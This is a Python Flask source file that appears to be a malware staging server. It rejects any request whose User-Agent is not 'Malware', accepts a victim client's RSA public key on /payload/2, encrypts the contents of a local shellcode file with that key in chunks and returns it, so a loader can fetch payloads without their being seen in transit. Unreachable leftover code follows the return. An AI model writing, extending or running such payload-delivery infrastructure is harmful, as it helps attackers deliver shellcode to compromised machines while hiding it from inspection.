from flask import Flask, request, send_file, abort, Response
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from wincrypto import CryptImportKey, CryptEncrypt, CryptGetKeyParam


app = Flask(__name__)

@app.before_request
def check_user_agent():
    user_agent = request.headers.get('User-Agent')
    if user_agent != 'Malware':
        abort(403)

@app.route('/payload/<int:id>', methods=['POST'])
def payload(id):
    if id == 2:
        print("request received from : ", request.remote_addr)
        public_key = request.data
        rsa_pub_key = CryptImportKey(public_key)
        with open('shellcode.hex', 'rb') as f:
            message = f.read()
        # message = b"Hello World dddddddddddddddddd Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
        print("message : ", message, " ", len(message))
        encrypted_message = b''
        for i in range(0, len(message), 50):
            chunk = message[i:i + 50]
            encrypted_chunk = CryptEncrypt(rsa_pub_key, chunk)
            encrypted_message += encrypted_chunk
        print("encrypted_message : ", encrypted_message, " ", len(encrypted_message))
        return Response(encrypted_message, content_type='application/octet-stream')
        # return b''.join(encrypted_message)
        # Send encrypted message as response to client
        join_encrypted = b''.join(encrypted_message)
        print("join_encrypted : ", join_encrypted, " ", len(join_encrypted))

        # Write encrypted message to file
        with open('encrypted_message.txt', 'wb') as f:
            f.write(join_encrypted)

        return send_file('encrypted_message.txt', mimetype='text/plain')
    else:
        return 'No payload for id {}'.format(id)

if __name__ == '__main__':
    app.debug = True
    app.run(host='0.0.0.0', port=5000)
